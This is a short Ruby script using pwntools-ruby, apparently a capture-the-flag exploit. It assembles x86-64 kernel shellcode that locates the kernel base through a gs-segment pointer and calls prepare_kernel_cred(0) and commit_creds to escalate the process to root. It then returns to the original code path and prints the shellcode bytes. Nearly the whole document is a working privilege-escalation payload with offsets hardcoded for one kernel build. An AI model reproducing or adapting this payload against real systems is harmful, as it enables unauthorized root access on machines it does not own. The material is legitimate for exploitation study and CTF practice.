#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby

def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def libc; @libc ||= ELF.new('./libc.so.6'); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = :amd64
# debug!

# org_ret = 0xffffffffab2b7389
# ffffffffab0b5da0 T commit_creds
# ffffffffab0b6080 T prepare_kernel_cred
# @sc: rsp+0x40: 0xffffffffab2a2546
# gs[0x5ac8]: 0xffffffffab0c7422

sc = asm(<<-EOS)
  push rax /* store regs */
  push rbp
  mov rax, 0x5ac8
  mov rbp, QWORD PTR gs:[rax]
  and rbp, 0xfffffffffff00000
  mov rdx, rbp
  add rdx, 0xb6080 /* prepare_kernel_cred */
  xor rdi, rdi
  call rdx
  mov rdi, rax
  mov rdx, rbp
  add rdx, 0xb5da0 /* commit_creds */
  call rdx
  pop rbp
  pop rax
  mov rdx, QWORD PTR [rsp + 0x40]
  and rdx, 0xfffffffffff00000
  add rdx, 0xb7389 /* org ret */
  push rdx
  ret
EOS

puts sc.bytes.join(',')
